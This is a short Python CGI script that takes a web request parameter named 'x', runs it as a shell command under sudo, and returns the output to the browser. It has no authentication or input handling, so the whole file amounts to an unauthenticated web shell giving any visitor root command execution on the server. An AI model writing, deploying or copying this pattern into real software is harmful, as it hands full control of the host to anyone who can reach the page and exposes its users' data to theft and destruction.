#!/usr/bin/python3

print("content-type: text/html")
print()

import subprocess
import cgi

mycmd=cgi.FieldStorage()
runcmd=mycmd.getvalue("x")
final = "sudo {0}".format(runcmd)
c=subprocess.getoutput(final)
print(c)